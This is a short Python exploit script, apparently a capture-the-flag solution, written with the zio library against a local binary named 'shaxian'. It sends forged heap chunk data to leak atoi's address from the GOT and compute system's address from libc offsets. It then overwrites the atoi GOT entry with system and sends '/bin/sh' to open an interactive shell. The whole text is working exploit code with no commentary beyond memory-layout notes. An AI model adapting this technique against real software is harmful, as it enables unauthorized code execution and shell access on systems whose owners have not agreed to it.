from zio import *
import ctypes
io  = zio('./shaxian_51f320b11793463ecdcfbb0c015cc273', print_read = COLORED(RAW, 'blue'), print_write = COLORED(RAW, 'red'), timeout = 10000)
io.hint([0x8048b95, 0x8048b8e])

# phone     0x804b0c0 - 0x804b1c0 
# head      0x804b1c0 - 0x804b1c4
# address   0x804b1e0 - 0x804b2e0

# content   0x04 - 0x40    
# next      0x24 - 0x28

got_atoi = 0x804b038

io.wl(l32(0x0) + l32(0x31))
io.wl('A' * 0xf0 + l32(0x0) + l32(0x31) + l32(got_atoi))

# order
io.wls([1, 'A' * 32 + l32(got_atoi), 1])

# review (leak)
io.wl(4)
io.rtl('Cart')
io.rtl('* ')
io.rtl('* ')
off_atoi    = 0x00031860
off_system  = 0x00040190
adr_atoi    = ctypes.c_uint32(int(io.rl()[0:])).value
adr_system  = adr_atoi - off_atoi + off_system

# order
io.wls([1, 'A' * 32 + l32(0x804b1b8), 1])

# submit
io.wl(2)

# order
io.wls([1, 'A' * 4 + l32(got_atoi), ctypes.c_int32(adr_system).value])

io.wl('/bin/sh')

io.itr()
